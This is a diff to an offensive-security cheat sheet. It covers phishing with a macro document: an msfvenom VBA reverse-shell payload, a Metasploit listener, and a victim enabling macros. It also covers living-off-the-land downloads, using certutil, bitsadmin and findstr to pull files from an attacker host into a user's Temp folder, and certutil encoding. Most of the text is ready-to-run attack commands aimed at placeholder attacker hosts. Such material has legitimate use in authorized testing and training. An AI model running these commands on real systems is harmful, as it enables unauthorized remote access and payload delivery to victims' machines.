@@ -1489,7 +1489,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba
 #    - Save the file as a Macro-Enabled type (e.g., .docm).
 
 # 4. (Attacker) Start Metasploit listener:
-msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; run"
+msfconsole -q -x "use exploit/multi/handler ; set payload <PAYLOAD> ; set lhost <ATTACKER_IP> ; set lport <PORT> ; run"
 
 # 5. (Target) Victim opens the document and enables macros.
 ```
@@ -2625,7 +2625,25 @@ C:\tools\UACME-Akagi64.exe 33
 
 ## 🌱 Living Off the Land
 
-Ref: https://lolbas-project.github.io/#
+- https://lolbas-project.github.io/#
+- https://live.sysinternals.com/
+    - `\\live.sysinternals.com\`
+
+```powershell
+### HTTP: File Transfer
+# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download
+certutil -URLcache -split -f http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>
+# https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/#download
+bitsadmin.exe /transfer /Download /priority Foreground http://<ATTACKER>/<FILE> C:\Users\<USER>\AppData\Local\Temp\<FILE>
+
+### SMB: File Transfer
+# https://lolbas-project.github.io/lolbas/Binaries/Findstr/#download
+findstr /V thisstringdoesnotexist \\<ATTACKER>\<SHARE>\<FILE> > C:\Users\<USER>\AppData\Local\Temp\<FILE>
+
+### Encode File (Base64 and PEM)
+# https://lolbas-project.github.io/lolbas/Binaries/Certutil/#encode
+certutil -encode <FILE> <ENCODED_FILE>
+```
 
 ### Pivoting and Tunneling OtL
 
